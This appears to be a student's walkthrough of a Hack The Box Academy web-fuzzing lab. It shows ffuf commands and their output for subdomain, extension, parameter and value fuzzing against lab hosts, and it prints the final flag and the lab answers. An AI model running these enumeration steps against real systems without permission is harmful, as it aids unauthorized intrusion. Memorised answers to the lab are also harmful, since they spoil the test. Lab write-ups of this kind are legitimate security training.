Run a sub-domain/vhost fuzzing scan on '*.academy.htb' for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)

1. Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?
```sh
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:$PORT/ -H 'Host: FUZZ.academy.htb' -fs 985        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/              v1.3.1 Kali Exclusive <3
________________________________________________ :: Method           : GET
 :: URL              : http://academy.htb:31965/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.academy.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 985
________________________________________________test                    [Status: 200, Size: 0, Words: 1, Lines: 1]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1]
:: Progress: [4989/4989] :: Job [1/1] :: 145 req/sec :: Duration: [0:00:44] :: Errors: 0 ::

```
2. One of the pages you will identify should say 'You don't have access!'. What is the full page URL?
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://archive.academy.htb:$PORT/indexFUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:$PORT/indexFUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://test.academy.htb:$PORT/indexFUZZ

```

3. In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?

fuf -w Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:59056/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.1.0-dev
________________________________________________
 :: Method           : POST
 :: URL              : http://faculty.academy.htb:59056/courses/linux-security.php7
 :: Wordlist         : FUZZ: /home/Anchovy/Dictionaries/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 774
________________________________________________
user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 40ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 46ms]
:: Progress: [6453/6453] :: Job [1/1] :: 913 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

4. Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
```sh
fuf -w General/wordlists/wordlists/usernames/xato_net_usernames.txt:FUZZ -u http://faculty.academy.htb:59056/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.1.0-dev
________________________________________________
 :: Method           : POST
 :: URL              : http://faculty.academy.htb:59056/courses/linux-security.php7
 :: Wordlist         : FUZZ: /home/Anchovy/General/wordlists/wordlists/usernames/xato_net_usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 781
________________________________________________
harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 41ms]

```

curl http://faculty.academy.htb:59056/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'
<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>
<html>
<!DOCTYPE html>
